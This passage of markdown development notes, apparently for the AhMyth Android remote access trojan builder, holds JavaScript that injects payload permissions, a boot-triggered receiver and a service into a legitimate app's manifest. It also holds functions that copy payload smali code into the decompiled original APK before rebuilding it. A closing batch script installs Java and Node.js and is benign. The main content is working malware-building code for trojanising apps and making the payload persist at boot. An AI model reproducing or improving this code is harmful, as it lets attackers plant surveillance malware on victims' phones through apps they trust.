            }

            // Filter selected permissions to exclude duplicates
            const filteredPermissions = selectedPermissions.filter((permission, index, self) => {
                return self.indexOf(permission) === index && !existingPermissions.has(permission);
            });

            delayedLog('[★] Injecting AhMyth Payload Permissions...');

            // Add new permissions and features based on filteredPermissions
            filteredPermissions.forEach(permission => {
                if (permission === 'android.hardware.camera') {
                    manifestObj['uses-feature'].push({
                        $: {
                            'android:name': 'android.hardware.camera'
                        },
                        _: '' // Add empty string as element text
                    });
                }

                if (permission === 'android.hardware.camera.autofocus') {
                    manifestObj['uses-feature'].push({
                        $: {
                            'android:name': 'android.hardware.camera.autofocus'
                        },
                        _: '' // Add empty string as element text
                    });
                }

                if (permission !== 'android.hardware.camera' && permission !== 'android.hardware.camera.autofocus') {
                    manifestObj['uses-permission'].push({
                        $: {
                            'android:name': permission
                        },
                        _: '' // Add empty string as element text
                    });
                }
            });

            delayedLog('[★] Injecting AhMyth Payload Service and Receiver...');

            // Construct the receiver and service tags using constants
            const receiverTag = {
                $: {
                    'android:enabled': 'true',
                    'android:exported': 'true',
                    'android:name': CONSTANTS.ahmythReceiver,
                },
                'intent-filter': {
                    action: {
                        $: {
                            'android:name': 'android.intent.action.BOOT_COMPLETED',
                        },
                    },
                },
            };

            const serviceTag = {
                $: {
                    'android:enabled': 'true',
                    'android:exported': 'false',
                    'android:name': CONSTANTS.ahmythService,
                },
            };

            // Add the receiver and service tags to the application node
            manifestObj.application.receiver.push(receiverTag);
            manifestObj.application.service.push(serviceTag);

            const builder = new xml2js.Builder({
                renderOpts: {
                    pretty: true,
                    indent: '    '
                },
                headless: true
            });

            // Modify the parsed object by finding and updating the closing application tag
            const closingAppTag = '</application>';
            const modifiedClosingAppTag = '\n  </application>';
            const xmlString = builder.buildObject(result);
            const modifiedXml = xmlString.replace(closingAppTag,
                modifiedClosingAppTag);

            // Find the closing manifest tag and replace it with a new closing tag (without the extra newline)
            const closingManifestTag = '</manifest>';
            const finalModifiedXml = modifiedXml.replace(closingManifestTag,
                '</manifest>');

            callback(null,
                finalModifiedXml);
        });
    };
```
</details>
<br></br>

## `createPayloadDirectory` function and `copyAhmythFilesAndGenerateApk` function
> Needs to be updated to fix further *Unsigned Short Value Out of Range* errors with apktool
<details>
  <summary>Code</summary>

```js
    $appCtrl.createPayloadDirectory = (files) => {
        var ignoreDirs = ['original',
            'res',
            'build',
            'kotlin',
            'lib',
            'assets',
            'META-INF',
            'unknown',
            'smali_assets'];
        var smaliList = files.filter((item) => item.isDirectory() && !(ignoreDirs.includes(item.name))).map((item) => item.name);
        var collator = new Intl.Collator([], {
            numeric: true
        });
        smaliList.sort((a, b) => collator.compare(a, b));
        var lastSmali = smaliList[smaliList.length - 1];

        if (lastSmali == "smali") {
            payloadSmaliFolder = '/smali_classes2';
            return payloadSmaliFolder;
        } else {
            var extractSmaliNumber = lastSmali.match(/[a-zA-Z_]+|[0-9]+/g);
            var lastSmaliNumber = parseInt(extractSmaliNumber[1]);
            var newSmaliNumber = lastSmaliNumber + 1;
            var payloadSmaliFolder = '/smali_classes' + newSmaliNumber;
            return payloadSmaliFolder;
        }
    };

    // function to copy ahmyth source files to the orginal app
    // and if success go to generate the apk
    $appCtrl.copyAhmythFilesAndGenerateApk = (apkFolder) => {

        delayedLog('[★] Reading the Decompiled Original Application...')
        fs.readdir(apkFolder, {
            withFileTypes: true
        }, (error, files) => {
            if (error) {
                delayedLog('[x] Failed to Read the Decompiled Original Application!', CONSTANTS.logStatus.FAIL);
                writeErrorLog(error, 'Reading.log');
                delayedLog('[¡] Error written to "Reading.log" on ', CONSTANTS.logStatus.INFO);
                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                return;
            }

            const payloadSmaliFolder = $appCtrl.createPayloadDirectory(files);
            const targetPayloadFolder = dir.join(apkFolder, payloadSmaliFolder);

            delayedLog(`[★] Creating the ${payloadSmaliFolder} Directory...`);
            fs.mkdir(targetPayloadFolder, {
                recursive: true
            }, (error) => {
                if (error) {
                    delayedLog(`[x] Unable to Create the ${payloadSmaliFolder} Directory!`, CONSTANTS.logStatus.FAIL);
                    return;
                }

                delayedLog(`[★] Copying Payload Files to the ${payloadSmaliFolder} Directory...`);
                fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"), targetPayloadFolder, {
                    overwrite: true
                }, (error) => {
                    if (error) {
                        delayedLog('[x] Copying Failed!', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Copying');
                        delayedLog('[¡] Error written to "Copying.log" on', CONSTANTS.logStatus.INFO);
                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    // Copy android directory to the smali folder in the apkFolder
                    fs.copy(dir.join(targetPayloadFolder, 'android'), dir.join(apkFolder, 'smali', 'android'), {
                        overwrite: true
                    }, (error) => {
                        if (error) {
                            delayedLog('[x] Copying "android" directory failed!', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'Copying "android" directory');
                            delayedLog('[¡] Error written to "Copying.log" on', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        // Copy androidx directory to the smali folder in the apkFolder
                        fs.copy(dir.join(targetPayloadFolder, 'androidx'), dir.join(apkFolder, 'smali', 'androidx'), {
                            overwrite: true
                        }, (error) => {
                            if (error) {
                                delayedLog('[x] Copying "androidx" directory failed!', CONSTANTS.logStatus.FAIL);
                                writeErrorLog(error, 'Copying "androidx" directory');
                                delayedLog('[¡] Error written to "Copying.log" on', CONSTANTS.logStatus.INFO);
                                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                return;
                            }

                            // Remove the original 'android' and 'androidx' directories
                            fs.rmdir(dir.join(targetPayloadFolder, 'android'), {
                                recursive: true
                            });
                            fs.rmdir(dir.join(targetPayloadFolder, 'androidx'), {
                                recursive: true
                            });

                            // Continue with Apk generation
                            $appCtrl.GenerateApk(apkFolder);
                        });
                    });
                });
            });
        });
    }
```
</details>
<br>

## Updated `autoinstall_win.bat` file.
> Makes use of the Windows Package Manager "Chocolatey" to automate installing external AhMyth Dependencies
>> Needs to be updated to look cleaner, present messages longer, check for `npm` as well as to see if any version of Java 8 through Java 21 is installed
<details>
    <summary>Updated "autoinstall_win.bat" file</summary>

```batch
@echo off

REM Step 1: Check for Chocolatey
echo [i] Checking to see if the Windows Package Manager "Chocolatey" is installed....
choco -? >nul 2>&1
if %errorlevel% neq 0 (
    echo [x] The Windows Package Manager "Chocolatey" is not installed on your system. This script requires "Chocolatey" to operate further, please install it.
    exit /b
) else (
    echo [Success] The Windows Package Manager "Chocolatey" is installed, proceeding....
)

REM Step 2: Check for Java installation
echo [i] Checking to see if Java is installed....
java -version >nul 2>&1
if %errorlevel% neq 0 (
    echo [i] Installing Java 17....
    choco install -y openjdk17
) else (
    echo [Success] Java is installed, proceeding....
)

REM Step 3: Check for Node.js and npm
echo [i] Checking to see if Node.js and npm are installed....
where node >nul 2>&1
if %errorlevel% neq 0 (
    echo [i] Installing Node.js and npm....
    choco install -y nodejs
) else (
    echo [Success] Node.js is installed, proceeding....
)

exit /b
```
</details>

